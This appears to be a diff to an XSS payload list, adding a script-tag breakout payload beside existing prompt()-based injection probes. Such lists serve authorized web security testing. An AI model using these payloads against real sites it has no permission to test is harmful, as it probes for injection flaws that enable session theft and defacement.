@@ -1,3 +1,4 @@
+">/><script>alert("1")</script><"
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
